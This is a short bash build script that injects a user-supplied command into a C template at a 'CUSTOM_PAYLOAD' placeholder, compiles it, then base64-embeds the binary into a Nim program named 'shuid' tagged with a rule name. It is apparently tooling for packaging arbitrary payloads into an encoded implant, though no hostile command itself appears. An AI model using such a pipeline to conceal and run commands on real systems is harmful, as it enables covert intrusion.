#!/bin/bash

#!/bin/bash

if [[ $# -ne 2 ]]; then
    echo "usage: ./build.sh \$COMMAND $\RULE_NAME"
    exit 92
fi

export COMMAND=$1
export RULE_NAME=$2
# use template to construct .c
echo "[*] Build interpreter"
cp src/interpreter/interpreter.c.tpl src/interpreter/interpreter.c
sed -i "s/CUSTOM_PAYLOAD/${COMMAND}/g" src/interpreter/interpreter.c
sed -i "s/CUSTOM_RULE_NAME/${RULE_NAME}/g" src/interpreter/interpreter.c
# compile interpreter
gcc src/interpreter/interpreter.c -o bin/interpreter
# compile shuid
echo "[*] Build shuid with interpreter embeded"
nim -o:bin/shuid c -d:INTERPRETER_CONTENT="`base64  -w0 < bin/interpreter`" -d:RULE_NAME="${RULE_NAME}"  --verbosity:0 src/shuid.nim